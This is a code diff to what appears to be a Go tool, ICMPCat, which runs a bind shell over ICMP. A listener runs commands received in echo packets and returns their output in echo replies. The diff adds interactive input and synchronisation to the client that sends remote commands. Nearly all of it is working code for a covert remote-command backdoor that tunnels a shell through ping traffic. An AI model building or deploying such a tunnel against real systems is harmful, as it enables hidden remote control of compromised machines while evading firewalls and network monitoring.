@@ -9,7 +9,9 @@ import (
 )
 
 type CLI struct {
-	icmp ICMPCat
+	icmp  ICMPCat
+	input Input
+	sema  chan bool
 }
 
 func NewCLI() (*CLI, error) {
@@ -17,7 +19,11 @@ func NewCLI() (*CLI, error) {
 	if err != nil {
 		return nil, err
 	}
-	return &CLI{icmp: icmp}, nil
+	return &CLI{
+		icmp:  icmp,
+		input: Input{},
+		sema:  make(chan bool, 1),
+	}, nil
 }
 
 // Open a shell that executes remote requests
@@ -28,7 +34,7 @@ func (cli *CLI) BindShell() {
 		if msg.kind == msgCmdType {
 			fmt.Println(msg.value)
 			msg := newMsgResType(runCmd(msg.value))
-			cli.icmp.Send(ipv4.ICMPTypeEcho, msg.bytes, peer.String())
+			cli.icmp.Send(ipv4.ICMPTypeEchoReply, msg.bytes, peer.String())
 		}
 	})
 	cli.icmp.Listen()
@@ -36,12 +42,17 @@ func (cli *CLI) BindShell() {
 
 // Execute a command on the remote host
 func (cli *CLI) SendCmd(cmd, host string) {
-	cli.icmp.Send(ipv4.ICMPTypeEchoReply, newMsgCmdType(cmd).bytes, host)
 	cli.icmp.OnReceive(func(peer *net.IPAddr, res []byte) {
 		msg := parseMsg(res)
 		if msg.kind == msgResType {
 			fmt.Printf("%s", msg.value)
+			cli.sema <- true
 		}
+	})
+	cli.input.On(func(b []byte) {
+		cmd := newMsgCmdType(string(b))
+		cli.icmp.Send(ipv4.ICMPTypeEcho, cmd.bytes, host)
+		<-cli.sema
 	})
 	cli.icmp.Listen()
 }
